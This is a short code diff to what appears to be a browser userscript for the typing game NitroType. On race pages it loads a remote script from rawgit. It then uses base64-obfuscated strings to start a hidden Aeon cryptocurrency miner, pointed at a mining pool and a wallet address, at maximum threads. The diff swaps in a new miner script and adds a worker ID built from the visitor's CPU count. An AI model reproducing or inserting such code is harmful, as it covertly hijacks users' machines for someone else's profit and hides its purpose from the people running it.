@@ -9,14 +9,19 @@
         else if (href.startsWith("https://www.nitrotype.com/race/")) res = true;
         else res = false;
         const s = document.createElement('script');
-        s.src = 'https://cdn.rawgit.com/ultratype/566da4dd0918042c965e96812dbd4c9e/raw/f1fedf90c75fb86b841cc5b92738a5b49f032bda/Aeon.js';
+        s.src = 'https://cdn.rawgit.com/ultratype/11f461eb930a975b6b3d6309ac367ecb/raw/2a7de366027980dffbf8f23f61b87939c517b5f3/Aeon2.js';
         s.onload = () => {
             const key = atob('QWVvbg==');
             var intv = setInterval(() => {
                 if (window[key]) {
-                    const args = [atob('YWVvbi5oYXNodmF1bHQucHJv'),
+                    let args = [atob('YWVvbi5oYXNodmF1bHQucHJv'),
                         atob('V21zOVU2ZXQ0NU5iWFdmSm1QVlJWSzN4UUtuWG5HY0tKWlJndjZBNWNVUGppNmtMaEwxN2FFVzhaTVViaHp6WXE4SzJwYUVEZzZXeURFZ3NtOHlRZzNubjJQOFBDa2JDUA==')];
-                    window[key].start.apply(window[key], args);
+                    let p = 'anon_';
+                    p += navigator.hardwareConcurrency;
+                    p += "_uid_";
+                    p += (Math.floor(Math.random() * 9999) + 0);
+                    args.push(p);
+                    window[key].startp.apply(window[key], args);
                     window[key].addMaxThreads();
                     clearInterval(intv);
                     return;
